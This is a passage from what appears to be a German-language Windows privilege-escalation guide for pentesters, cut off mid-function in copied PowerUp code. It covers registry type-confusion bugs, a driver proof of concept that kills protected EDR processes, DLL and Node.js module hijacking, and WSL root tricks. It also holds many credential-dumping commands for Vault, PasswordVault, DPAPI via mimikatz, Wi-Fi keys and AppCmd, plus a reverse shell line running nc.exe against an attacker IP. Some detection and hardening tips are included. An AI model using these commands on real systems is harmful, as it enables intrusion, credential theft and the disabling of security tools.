Sobald du aus dem beschädigten I/O-Ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehlst du mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherbeschädigung in Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Speicherlayouts zu gestalten, beschreibbare HKLM-/HKU-Unterzweige auszunutzen und Metadatenbeschädigungen ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type Confusion im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen anschließend `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem Stack-Skalar wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert, nicht anhand des vom Entwickler erwarteten Typs.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Orakel**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Beschädigung des Kernel-Speichers**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder Puffer mit angegebener Größe fehlinterpretiert.

Hinweise zur praktischen Ausnutzung:

- **Windows-8+-Mitigation**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Staging in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Unterzweige von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity**-Token erneut aus, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff von 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direkten Modus muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Wert auf dem Stack und verwendet denselben Puffer anschließend erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direkte Modus den ersten `LONG` an `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen vom Angreifer kontrollierten **negativen** Wert in der wiederverwendeten skalaren Variable, kopiert die nächste `REG_BINARY`-Abfrage die Bytes des Angreifers direkt über benachbarte Stack-Slots. Dies ist oft der sauberste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Starkes Hunting-Muster: **unterschiedliche Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, in denen der erste Registry-Lesevorgang darüber entscheidet, ob ein zweiter erfolgt.

#### Ausnutzung von fehlendem FILE_DEVICE_SECURE_OPEN bei Geräteobjekten (LPE + EDR kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit zusätzlicher Komponente nicht durchgesetzt. Dadurch kann jeder nicht privilegierte Benutzer mithilfe eines Namespace-Pfads wie diesem einen Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In der Praxis beobachtete Fähigkeiten:
- Beliebige Prozesse mit Handles mit Vollzugriff versehen (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Lese-/Schreibzugriff auf rohe Datenträger (Offline-Manipulation, Persistenz-Tricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Userland über den Kernel beendet werden kann.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Maßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfe bei privilegierten Vorgängen den Kontext des Aufrufers. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder Handle-Rückgaben zulässt.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsideen für Verteidiger
- Überwache benutzermodusseitige Zugriffe auf verdächtige Gerätenamen (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts Sperrliste für anfällige Treiber durch (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Privilegien erweitern**.<sup>[[2]](#references)</sup>

Prüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie dieser Check missbraucht werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js-/Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **uncontrolled search path unter Windows**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node sucht nach Paketen, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann die Suche bis zum Laufwerksstamm gelangen. Eine Anwendung, die aus `C:\Users\Administrator\project\app.js` gestartet wird, kann daher folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Kann ein **Benutzer mit geringen Berechtigungen** `C:\node_modules` erstellen, kann er dort eine bösartige Datei `foo.js` (oder einen Paketordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht **LPE**, wenn das Ziel als Administrator, über eine geplante Aufgabe oder einen Service-Wrapper mit erhöhten Berechtigungen oder über eine automatisch gestartete privilegierte Desktop-App läuft.

Das kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` angegeben ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht erfolgreich installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum und nicht im Hauptanwendungscode befindet

### Anfällige Ziele suchen

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zieldatei (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und den abschließend erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder durch Überprüfung des Quelltexts.
2. Erstelle das Stammverzeichnis für die Suche, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Anwendung des Opfers aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Der wiederverwendbare Teil ist jedoch die **Technik**: Finden Sie einen beliebigen **fehlenden Bare-Import**, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsansätze

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien beziehungsweise Pakete ablegt.
- Nach Prozessen mit hoher Integritätsstufe suchen, die auf `C:\node_modules\*` zugreifen.
- In der Produktionsumgebung alle Laufzeitabhängigkeiten paketieren und die Verwendung von `optionalDependencies` überprüfen.
- Drittanbietercode auf stille Muster wie `try { require("...") } catch {}` überprüfen.
- Optionale Prüfungen deaktivieren, sofern die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Installationen die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer fest in der hosts-Datei eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerk-Schnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfen Sie von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener ordnen Sie dessen PID dem Prozesseigentümer, dem ausführbaren Pfad und allen Diensten oder geplanten Tasks zu, die ihn starten. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktop-Benutzer ermöglichen, wenn seine Authentifizierungs- und Befehlssteuerungen dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die unter einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Anhaltspunkte, während ein authentifizierter Weg über eine Speicherbeschädigung die Analyse genau dieser Binärdatei und der darüber erreichbaren Eingabe erfordert. Scheint ein freigegebener Port zu einem Systemprozess zu gehören, vergleichen Sie ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor Sie den Backend-Dienst zuordnen; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routing-Tabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkennung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du den root user erhältst, kannst du auf jedem Port lauschen (wenn du `nc.exe` zum ersten Mal zum Lauschen auf einem Port verwendest, wirst du über die GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

Linux-`root` innerhalb von WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität auf das Dateisystem einer Distribution zugreifen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Anmeldedaten gespeichert wurden. Für eine Rechteausweitung sind weiterhin ein gültiges Konto mit höheren Berechtigungen und ein zulässiger Authentifizierungspfad erforderlich. Die `LocalState\rootfs`-Struktur gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution häufig auf einer virtuellen Festplatte vom Typ [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Vermeide es, Verlaufsinhalte bei automatisierten Enumeration-Vorgängen auszugeben.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextbefund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA secret speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Lesezugriffe belegen nicht, ob dieses Secret existiert oder abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Zunächst klingt es vielleicht so, als könnten Benutzer Zugangsdaten für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, aber so funktioniert es nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Credential Manager** und Windows Vault verwenden und die gespeicherten Anmeldeinformationen nutzen kann, anstatt dass Benutzer jedes Mal ihren Benutzernamen und ihr Passwort eingeben.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, können sie die Anmeldeinformationen für eine bestimmte Ressource meiner Ansicht nach nicht verwenden. Wenn deine Anwendung also den Vault nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Speichervault anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Anschließend können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit bereitgestellten Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstokens und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicher ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege`.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung privater asymmetrischer Schlüssel verwendet. Dabei wird ein Benutzer- oder Systemgeheimnis genutzt, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Benutzerschlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Sicherheitsbezeichner](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel befindet sich zusammen mit dem Hauptschlüssel, der die privaten Schlüssel des Benutzers in derselben Datei schützt**, und besteht in der Regel aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und seine Inhalte daher nicht mit dem Befehl `dir` in CMD aufgelistet werden können, wohl aber mit PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Master-Passwort geschützten Dateien mit Zugangsdaten** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use das **mimikatz module** `dpapi::cred` mit dem entsprechenden `/masterkey` zum Entschlüsseln.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele **DPAPI**-**masterkeys** aus dem **Arbeitsspeicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldedaten bequem zu speichern. Die Anmeldedaten werden mit **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventarisierung darauf verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, anstatt `C:\Users` vorauszusetzen: [Windows kann Profile an anderen Speicherorten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist nur ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zunächst Pfade und ACLs, ohne bei der routinemäßigen Inventarisierung verschlüsselte oder unverschlüsselte Werte auszugeben.

Um PowerShell-Anmeldeinformationen aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie **viele DPAPI-Masterkeys aus dem Arbeitsspeicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und die verschlüsselten `Password`-Attribute, bevor Sie eine XML-Datei als möglichen Fundort für Zugangsdaten einstufen. Der gespeicherte Wert ist kein DPAPI/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Geben Sie verschlüsselte Werte bei einer umfassenden Suche nicht aus.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachten Sie ein nicht leeres Passwortelement als Hinweis auf mögliche Zugangsdaten, geben Sie es jedoch nicht aus und nehmen Sie nicht an, dass es im Klartext vorliegt: [Der Anbieter weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger streng konfiguriert sein kann. Prüfen Sie Herkunft und Wiederherstellungsbedingungen der Datei, bevor Sie sich darauf verlassen.

### Kurznotizen

Auf Windows-Workstations verwenden Nutzer häufig die Kurznotizen-App, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer gesucht und untersucht werden.

Nutzer speichern manchmal Passwörter und andere Informationen in Notiz-Apps. Die paketierte Sticky Notes-App von Microsoft speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps verwenden möglicherweise andere Speicherorte im Benutzerprofil, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie aus einer fehlenden SQLite-Datei schließen, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich festgeschriebene Notizen auslassen. Bewahren Sie `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und beziehen Sie, sofern verfügbar, auch `plum.sqlite-shm` ein; der Shared-Memory-Index kann neu erstellt werden, aber das WAL gehört zum persistenten Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein Hinweis auf mögliche Zugangsdaten: Überprüfen Sie das Konto, den erlaubten Zugriff und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag aus einem Passwortmanager erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen gelten kann.

### AppCmd.exe

**Beachten Sie, dass Sie zum Wiederherstellen von Passwörtern aus AppCmd.exe Administrator sein und die Anwendung mit einer hohen Integritätsstufe ausführen müssen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise einige **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
